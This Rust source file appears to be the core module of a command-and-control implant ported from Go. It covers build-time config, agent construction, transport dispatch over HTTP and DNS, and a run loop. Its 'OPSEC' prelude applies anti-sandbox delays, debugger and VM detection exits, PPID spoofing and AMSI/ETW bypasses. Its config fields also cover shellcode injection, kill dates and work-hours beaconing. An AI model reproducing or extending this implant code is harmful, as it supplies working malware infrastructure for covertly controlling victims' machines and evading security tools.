//! Agent construction and the OPSEC prelude.
//!
//! `run_agent(cfg)` replaces the Go `Main(cfg)`: worker-mode
//! short-circuit, OPSEC checks, `new_agent`, relay-listener
//! setup, `Agent::run`. `new_agent(cfg)` replaces `newAgent`.

use std::sync::{Arc, Mutex};
use std::time::Duration;

use rand::{rngs::StdRng, SeedableRng};

use crate::config;
use crate::crypto::wire::{WireError, WireSession};
use crate::evasion;
use crate::features::shaping::{validate_shaping_spec, ShapingSpec};
use crate::platform;
use crate::protocol::{
    CheckinResponse, Identity, Profile, SharedState, TaskResult,
    Transport, TransportError,
};
use crate::transport;

use super::diag::diag_enabled;
use super::helpers::truncate;
use super::identity::{gather_identity, parse_ecdsa_private_key, parse_ecdsa_public_key};
use super::tls_config::{build_doh_tls_config, build_tls_config, default_profile};

// =====================================================================
// Errors
// =====================================================================

/// Errors from agent construction and the run loop.
///
/// Every variant names a specific failure mode. `From<TransportError>`
/// and `From<WireError>` are implemented so callers use `?` on the
/// transport and crypto layers without wrapping.
#[derive(Debug, thiserror::Error)]
pub enum AgentError {
    #[error("config: {0}")]
    Config(String),

    #[error("transport: {0}")]
    Transport(#[from] TransportError),

    #[error("wire: {0}")]
    Wire(#[from] WireError),

    #[error("tls: {0}")]
    Tls(String),

    #[error("identity: {0}")]
    Identity(String),

    #[error("profile: {0}")]
    Profile(String),

    #[error("shaping: {0}")]
    Shaping(String),

    #[error("signature: {0}")]
    Signature(String),

    #[error("{0}")]
    Other(String),
}

// =====================================================================
// Config
// =====================================================================

/// The agent's build-time configuration.
///
/// In the Go tree, `Main(cfg)` copied `cfg.*` into package-level
/// globals. The Rust port keeps `Config` as a struct passed through
/// `new_agent(cfg)`, and `Agent` holds it. `Config::from_consts()`
/// reads every value from the `config::*` constants `build.rs`
/// generated.
///
/// Fields absent from this struct relative to Go's `Config`:
/// - `ObfKeyHex` (build-time deobfuscation is `build.rs`'s job)
/// - `WireTLSProfile`, `DNSVerbB/T/R`, `DNSPayloadChunkSize`
///   (now `config::TLS_PROFILE` and `config::DNS_*`)
///
/// The schedule fields (`Sleep`, `Jitter`, `Kill`) that Go held as
/// package globals are now in `SharedState`.
#[derive(Clone, Debug, Default)]
pub struct Config {
    pub default_url: String,
    pub default_profile: String,
    pub server_pubkey_pem_b64: String,
    pub client_cert_pem_b64: String,
    pub client_key_pem_b64: String,
    pub root_ca_pem_b64: String,
    pub profile_json: String,
    pub agent_priv_key_pem_b64: String,

    pub transport_mode: String,
    pub dns_domain: String,
    pub dns_resolver: String,
    pub icmp_host: String,
    pub doh_resolver: String,
    pub doh_host_header: String,
    pub doh_user_agent: String,
    pub websocket_url: String,

    pub wireguard_server_pubkey: String,
    pub wireguard_server_addr: String,
    pub wireguard_agent_privkey: String,
    pub wireguard_tunnel_ip: String,
    pub wireguard_server_tunnel_ip: String,
    pub wireguard_inner_port: String,

    pub smb_pipe: String,
    pub smb_relay_pipe: String,
    pub tcp_bind_addr: String,
    pub tcp_bind_token: String,
    pub tcp_relay_target: String,
    pub tcp_relay_token: String,
    pub tcp_rev_listen: String,
    pub tcp_rev_target: String,
    pub tcp_rev_token: String,

    pub server_ecdh_pubkey_b64: String,
    pub pivot_priv_key_b64: String,
    pub pivot_pub_key_b64: String,

    pub identity_role: String,
    pub injector_shellcode_b64: String,
    pub inject_method: String,

    pub default_sleep_seconds: u64,
    pub default_jitter: f64,
    pub kill_days: i64,
    pub transport_failover_after: u8,
    pub work_hours_start: u32,
    pub work_hours_end: u32,
    pub tls_profile: String,

    pub anti_sandbox: bool,
    pub sleep_mask: bool,
    pub sleep_mask_type: String,
    pub syscall_method: String,
    pub amsi_bypass: bool,
    pub etw_patch: bool,
    pub string_obfuscation: bool,
    pub ppid_spoof: bool,
    pub antidebug: bool,
    pub antivm: bool,
    pub verbose: bool,
}

impl Config {
    /// Build `Config` from the `TC2_*` constants `build.rs` wrote
    /// into `config_generated.rs`.
    pub fn from_consts() -> Self {
        Self {
            default_url: config::DEFAULT_URL.to_string(),
            default_profile: config::DEFAULT_PROFILE.to_string(),
            server_pubkey_pem_b64: config::SERVER_PUBKEY_PEM_B64.to_string(),
            client_cert_pem_b64: config::CLIENT_CERT_PEM_B64.to_string(),
            client_key_pem_b64: config::CLIENT_KEY_PEM_B64.to_string(),
            root_ca_pem_b64: config::ROOT_CA_PEM_B64.to_string(),
            profile_json: config::PROFILE_JSON.to_string(),
            agent_priv_key_pem_b64: config::AGENT_PRIV_KEY_PEM_B64.to_string(),

            transport_mode: config::TRANSPORT_MODE.to_string(),
            dns_domain: config::DNS_DOMAIN.to_string(),
            dns_resolver: config::DNS_RESOLVER.to_string(),
            icmp_host: config::ICMP_HOST.to_string(),
            doh_resolver: config::DOH_RESOLVER.to_string(),
            doh_host_header: config::DOH_HOST_HEADER.to_string(),
            doh_user_agent: config::DOH_USER_AGENT.to_string(),
            websocket_url: config::WEBSOCKET_URL.to_string(),

            wireguard_server_pubkey: config::WIREGUARD_SERVER_PUBKEY.to_string(),
            wireguard_server_addr: config::WIREGUARD_SERVER_ADDR.to_string(),
            wireguard_agent_privkey: config::WIREGUARD_AGENT_PRIVKEY.to_string(),
            wireguard_tunnel_ip: config::WIREGUARD_TUNNEL_IP.to_string(),
            wireguard_server_tunnel_ip: config::WIREGUARD_SERVER_TUNNEL_IP.to_string(),
            wireguard_inner_port: config::WIREGUARD_INNER_PORT.to_string(),

            smb_pipe: config::SMB_PIPE.to_string(),
            smb_relay_pipe: config::SMB_RELAY_PIPE.to_string(),
            tcp_bind_addr: config::TCP_BIND_ADDR.to_string(),
            tcp_bind_token: config::TCP_BIND_TOKEN.to_string(),
            tcp_relay_target: config::TCP_RELAY_TARGET.to_string(),
            tcp_relay_token: config::TCP_RELAY_TOKEN.to_string(),
            tcp_rev_listen: config::TCP_REV_LISTEN.to_string(),
            tcp_rev_target: config::TCP_REV_TARGET.to_string(),
            tcp_rev_token: config::TCP_REV_TOKEN.to_string(),

            server_ecdh_pubkey_b64: config::SERVER_ECDH_PUBKEY_B64.to_string(),
            pivot_priv_key_b64: config::PIVOT_PRIV_KEY_B64.to_string(),
            pivot_pub_key_b64: config::PIVOT_PUB_KEY_B64.to_string(),

            identity_role: config::IDENTITY_ROLE.to_string(),
            injector_shellcode_b64: String::new(), // INJECTOR_SHELLCODE is &[u8], not b64
            inject_method: config::INJECT_METHOD_DEFAULT.to_string(),

            default_sleep_seconds: config::DEFAULT_SLEEP.max(1) as u64,
            default_jitter: 0.3,
            kill_days: config::KILL_DAYS as i64,
            transport_failover_after: config::TRANSPORT_FAILOVER_AFTER.clamp(0, 255) as u8,
            work_hours_start: crate::core::diag::parse_clock(config::WORK_HOURS_START)
                .unwrap_or(480),
            work_hours_end: crate::core::diag::parse_clock(config::WORK_HOURS_END)
                .unwrap_or(1140),
            tls_profile: config::TLS_PROFILE.to_string(),

            anti_sandbox: config::ANTISANDBOX,
            sleep_mask: config::SLEEP_MASK_ENABLED,
            sleep_mask_type: config::SLEEP_MASK_TYPE.to_string(),
            syscall_method: config::SYSCALL_METHOD.to_string(),
            amsi_bypass: config::AMSI_BYPASS,
            etw_patch: config::ETW_PATCH,
            string_obfuscation: config::STRING_OBFUSCATION,
            ppid_spoof: config::PPID_SPOOF,
            antidebug: config::ANTIDEBUG,
            antivm: config::ANTIVM,
            verbose: config::VERBOSE,
        }
    }
}

// =====================================================================
// Agent
// =====================================================================

/// The running agent. Held by `run_agent`, mutated by `run`.
pub struct Agent {
    pub cfg: Config,

    pub transports: Vec<Box<dyn Transport>>,
    pub transport_names: Vec<&'static str>,
    pub transport_index: usize,
    pub transport_failures: u32,

    pub session: CheckinResponse,
    pub identity: Identity,
    pub profile: Profile,
    pub deadline: Option<std::time::Instant>,
    pub spawn_to: Option<String>,

    pub server_pub: Option<p256::ecdsa::VerifyingKey>,
    pub agent_priv: Option<p256::ecdsa::SigningKey>,
    pub wire: WireSession,
    pub shaping: Option<ShapingSpec>,

    pub state: Arc<SharedState>,
    pub rng: Mutex<StdRng>,
}

// =====================================================================
// run_agent — the Main(cfg) replacement
// =====================================================================

/// Build and run the agent. Replaces `Main(cfg)`.
///
/// Order matches the Go tree:
/// 1. Worker-mode short-circuit
/// 2. Syscall method set
/// 3. OPSEC checks (anti-sandbox, anti-debug, anti-VM, PPID, AMSI/ETW)
/// 4. `new_agent(cfg)`
/// 5. `signal_migrate_ready` (migrate handshake — no-op if not migrated)
/// 6. Relay-listener setup (SMB, TCP bind, TCP reverse)
/// 7. `agent.run()`
pub async fn run_agent(cfg: Config) -> Result<(), AgentError> {
    if platform::is_worker_mode() {
        std::process::exit(platform::run_worker());
    }

    if diag_enabled() {
        eprintln!("[core] === agent starting ===");
        eprintln!(
            "[core] target os={} arch={}",
            std::env::consts::OS,
            std::env::consts::ARCH,
        );
        eprintln!(
            "[core] config: transport={:?} url={:?} dns_zone={:?} \
             icmp_host={:?} smb_pipe={:?} tcp_bind={:?} ws_url={:?}",
            cfg.transport_mode, cfg.default_url, cfg.dns_domain,
            cfg.icmp_host, cfg.smb_pipe, cfg.tcp_bind_addr,
            cfg.websocket_url,
        );
        eprintln!(
            "[core] config: wg_server_addr={:?} wg_tunnel_ip={:?} \
             wg_has_pubkey={} wg_has_privkey={}",
            cfg.wireguard_server_addr, cfg.wireguard_tunnel_ip,
            !cfg.wireguard_server_pubkey.is_empty(),
            !cfg.wireguard_agent_privkey.is_empty(),
        );
        eprintln!(
            "[core] config: tls_profile={:?} kill_days={} \
             work_hours={:02}:{:02}-{:02}:{:02} failover_after={}",
            cfg.tls_profile, cfg.kill_days,
            cfg.work_hours_start / 60, cfg.work_hours_start % 60,
            cfg.work_hours_end / 60, cfg.work_hours_end % 60,
            cfg.transport_failover_after,
        );
    }

    evasion::set_syscall_method(&cfg.syscall_method);

    // ---- OPSEC checks ------------------------------------------------
    if cfg.anti_sandbox {
        if evasion::sandbox_detected() {
            let secs = 4 * 3600 + (rand::random::<u64>() % 3600);
            tokio::time::sleep(Duration::from_secs(secs)).await;
            if evasion::sandbox_detected() {
                return Err(AgentError::Other(
                    "sandbox still detected — exiting".to_string(),
                ));
            }
        }
    }
    if cfg.antidebug && evasion::debugger_detected() {
        return Err(AgentError::Other(
            "debugger detected — exiting".to_string(),
        ));
    }
    if cfg.antivm && evasion::in_vm() {
        return Err(AgentError::Other(
            "VM detected — exiting".to_string(),
        ));
    }
    #[cfg(target_os = "windows")]
    {
        if cfg.ppid_spoof && evasion::ppid_spoof() {
            return Ok(());
        }
        if cfg.amsi_bypass || cfg.etw_patch {
            evasion::apply_windows_evasion(cfg.amsi_bypass, cfg.etw_patch);
        }
    }

    // ---- Construction ------------------------------------------------
    let mut agent = new_agent(cfg).await?;

    // ---- Migrate handshake -------------------------------------------
    crate::core::migrate::signal_migrate_ready();

    // ---- Relay listeners ---------------------------------------------
    // The SMB/TCP/TCP-reverse relay listeners depend on the pivot
    // module, which is not ported yet. The Go tree skips them when
    // the corresponding config is empty; the Rust tree logs the
    // skip when the corresponding config is non-empty. A future
    // port wires them in here.
    if !agent.cfg.smb_relay_pipe.is_empty() {
        eprintln!(
            "[core] smb relay listener not yet ported; \
             smb_relay_pipe={:?} ignored",
            agent.cfg.smb_relay_pipe,
        );
    }
    if !agent.cfg.tcp_relay_target.is_empty() {
        eprintln!(
            "[core] tcp relay listener not yet ported; \
             tcp_relay_target={:?} ignored",
            agent.cfg.tcp_relay_target,
        );
    }
    if !agent.cfg.tcp_rev_listen.is_empty() {
        eprintln!(
            "[core] tcp reverse relay listener not yet ported; \
             tcp_rev_listen={:?} ignored",
            agent.cfg.tcp_rev_listen,
        );
    }

    // ---- Run ---------------------------------------------------------
    agent.run().await
}

// =====================================================================
// new_agent — the newAgent(cfg) replacement
// =====================================================================

pub async fn new_agent(cfg: Config) -> Result<Agent, AgentError> {
    let mut rng = StdRng::from_entropy();

    // ---- Pivot keys ------------------------------------------------
    let _pivot_priv = if !cfg.pivot_priv_key_b64.is_empty() {
        Some(decode_pivot_priv(&cfg.pivot_priv_key_b64)?)
    } else {
        None
    };
    let _pivot_pub = if !cfg.pivot_pub_key_b64.is_empty() {
        Some(decode_pivot_pub(&cfg.pivot_pub_key_b64)?)
    } else {
        None
    };
    // Pivot key material is used by the SMB / TCP / TCP-reverse
    // transports, which are not yet ported. Deferred; kept here so
    // the config is validated.

    // ---- C2 profile ------------------------------------------------
    let mut profile = default_profile();
    let profile_blob: Vec<u8> = if cfg.profile_json.is_empty() {
        Vec::new()
    } else {
        match serde_json::from_str::<Profile>(&cfg.profile_json) {
            Ok(p) => {
                profile = p;
                cfg.profile_json.as_bytes().to_vec()
            }
            Err(_) => match base64::engine::general_purpose::STANDARD
                .decode(&cfg.profile_json)
            {
                Ok(raw) => {
                    let _ = serde_json::from_slice::<Profile>(&raw)
                        .map(|p| profile = p);
                    raw
                }
                Err(_) => Vec::new(),
            },
        }
    };
    let profile = profile.resolved();

    // ---- Shaping ---------------------------------------------------
    let shaping = if !profile_blob.is_empty() {
        let raw: serde_json::Value = serde_json::from_slice(&profile_blob)
            .map_err(|e| AgentError::Profile(e.to_string()))?;
        raw.get("shaping")
            .and_then(|sh| sh.as_object().map(|_| sh))
            .map(|sh| serde_json::from_value::<ShapingSpec>(sh.clone()))
            .transpose()
            .map_err(|e| {
                AgentError::Shaping(format!(
                    "embedded shaping block is malformed: {e}"
                ))
            })?
            .map(|spec| {
                validate_shaping_spec(&spec)
                    .map(|_| spec)
                    .map_err(|e| {
                        AgentError::Shaping(format!(
                            "embedded shaping block is invalid: {e}"
                        ))
                    })
            })
            .transpose()?
    } else {
        None
    };

    // ---- Signing keys ----------------------------------------------
    let server_pub = if !cfg.server_pubkey_pem_b64.is_empty() {
        base64::engine::general_purpose::STANDARD
            .decode(&cfg.server_pubkey_pem_b64)
            .ok()
            .and_then(|raw| parse_ecdsa_public_key(&raw))
    } else {
        None
    };
    let agent_priv = if !cfg.agent_priv_key_pem_b64.is_empty() {
        base64::engine::general_purpose::STANDARD
            .decode(&cfg.agent_priv_key_pem_b64)
            .ok()
            .and_then(|raw| parse_ecdsa_private_key(&raw).ok())
    } else {
        None
    };

    // ---- Wire session ----------------------------------------------
    let wire = WireSession::new(&cfg.server_ecdh_pubkey_b64)?;

    // ---- Shared state ----------------------------------------------
    let state = Arc::new(SharedState::from_consts());

    // ---- Transport dispatch ----------------------------------------
    let (mut transports, mut transport_names): (
        Vec<Box<dyn Transport>>,
        Vec<&'static str>,
    ) = (Vec::new(), Vec::new());

    // The four "child" transports are mutually exclusive with
    // TransportMode being anything else. They short-circuit the
    // dispatch: the rest of `transport_mode` is ignored.
    if !cfg.smb_pipe.is_empty() {
        return Err(AgentError::Other(
            "smb transport is not yet ported".to_string(),
        ));
    }
    if !cfg.tcp_bind_addr.is_empty() {
        return Err(AgentError::Other(
            "tcp bind transport is not yet ported".to_string(),
        ));
    }
    if !cfg.tcp_rev_target.is_empty() {
        return Err(AgentError::Other(
            "tcp reverse transport is not yet ported".to_string(),
        ));
    }

    let modes = split_transport_modes(&cfg.transport_mode);
    if modes.is_empty() {
        return Err(AgentError::Other(
            "no transport configured".to_string(),
        ));
    }

    // Gather identity once — the transports need it.
    let identity = gather_identity(&cfg);

    for mode in &modes {
        match mode.as_str() {
            "http" => {
                let tls = build_tls_config(&cfg)?;
                let t = transport::http::HttpTransport::new(
                    &cfg.default_url,
                    profile.clone(),
                    &tls,
                    shaping.clone(),
                    state.clone(),
                )?;
                transports.push(Box::new(t));
                transport_names.push("http");
            }
            "dns" => {
                if cfg.dns_domain.is_empty() {
                    return Err(AgentError::Config(
                        "transport=dns but no DNSDomain".to_string(),
                    ));
                }
                let t = transport::dns::DnsTransport::new(
                    &cfg.dns_domain,
                    &cfg.dns_resolver,
                )?;
                transports.push(Box::new(t));
                transport_names.push("dns");
            }
            "doh" | "icmp" | "quic" | "websocket" | "wireguard" => {
                return Err(AgentError::Other(format!(
                    "transport {mode:?} is not yet ported"
                )));
            }
            "tcp" => {
                return Err(AgentError::Config(
                    "transport 'tcp' must be used alone, via TCPBindAddr"
                        .to_string(),
                ));
            }
            "tcprev" => {
                return Err(AgentError::Config(
                    "transport 'tcprev' must be used alone, via TCPRevTarget"
                        .to_string(),
                ));
            }
            other => {
                return Err(AgentError::Config(format!(
                    "unknown transport: {other}"
                )));
            }
        }
    }

    // ---- Kill deadline ---------------------------------------------
    let deadline = if cfg.kill_days > 0 {
        Some(
            std::time::Instant::now()
                + Duration::from_secs(cfg.kill_days as u64 * 86_400),
        )
    } else {
        None
    };

    if diag_enabled() {
        eprintln!(
            "[agent] identity: host={:?} user={:?} machine_id={:?} \
             os={:?} arch={:?}",
            identity.hostname, identity.username,
            truncate(&identity.machine_id, 16),
            identity.os, identity.arch,
        );
        eprintln!(
            "[agent] newAgent complete — {} transport(s)",
            transports.len(),
        );
    }

    Ok(Agent {
        cfg,
        transports,
        transport_names,
        transport_index: 0,
        transport_failures: 0,
        session: CheckinResponse::default(),
        identity,
        profile,
        deadline,
        spawn_to: None,
        server_pub,
        agent_priv,
        wire,
        shaping,
        state,
        rng: Mutex::new(rng),
    })
}

// =====================================================================
// Utility
// =====================================================================

pub fn split_transport_modes(s: &str) -> Vec<String> {
    s.split(',')
        .map(|p| p.trim().to_ascii_lowercase())
        .filter(|p| !p.is_empty())
        .collect()
}

fn decode_pivot_priv(
    b64: &str,
) -> Result<p256::SecretKey, AgentError> {
    use base64::Engine as _;
    let raw = base64::engine::general_purpose::STANDARD
        .decode(b64)
        .map_err(|e| AgentError::Identity(format!("pivot priv b64: {e}")))?;
    p256::SecretKey::from_sec1_der(&raw)
        .map_err(|e| AgentError::Identity(format!("pivot priv parse: {e}")))
}

fn decode_pivot_pub(b64: &str) -> Result<p256::PublicKey, AgentError> {
    use base64::Engine as _;
    let raw = base64::engine::general_purpose::STANDARD
        .decode(b64)
        .map_err(|e| AgentError::Identity(format!("pivot pub b64: {e}")))?;
    p256::PublicKey::from_sec1_bytes(&raw)
        .map_err(|e| AgentError::Identity(format!("pivot pub parse: {e}")))
}

// Silence unused warnings for stubs whose symbols are only
// referenced in commented-out code.
#[allow(dead_code)]
fn _unused(_t: TaskResult, _e: WireError, _b: build_doh_tls_config_marker) {}
#[allow(dead_code)]
struct build_doh_tls_config_marker;